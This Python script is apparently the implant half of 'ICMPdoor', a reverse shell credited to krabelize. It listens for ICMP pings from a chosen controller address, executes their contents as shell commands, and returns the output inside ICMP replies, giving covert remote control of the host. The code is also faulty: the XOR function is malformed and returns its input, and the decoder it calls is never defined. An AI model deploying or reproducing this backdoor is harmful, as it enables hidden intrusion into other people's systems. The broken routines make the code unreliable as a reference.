#!/usr/bin/env python3
#ICMPdoor (IMCP reverse shell) [implant]
#By krabelize | cryptsus.com
#More info: https://cryptsus.com/blog/icmp-reverse-shell.html
from scapy.all import sr,IP,ICMP,Raw,sniff
import argparse
import os

#Variables
ICMP_ID = int(13170)
TTL = int(64)

def enc(payload):
    xorkey = payload[0]
    for i in range(1, len(payload - 1)):
        ret_payload += payload[i] ^ xorkey
    return payload

def check_scapy():
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print("Install the Py3 scapy module")

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def icmpshell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        icmppaket = dec(pkt[Raw].load)
        icmppaket = icmppaket.decode('utf-8', errors='ignore')
        payload = os.popen(icmppaket).readlines()
        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

print("[+]ICMP listener started!")
sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")
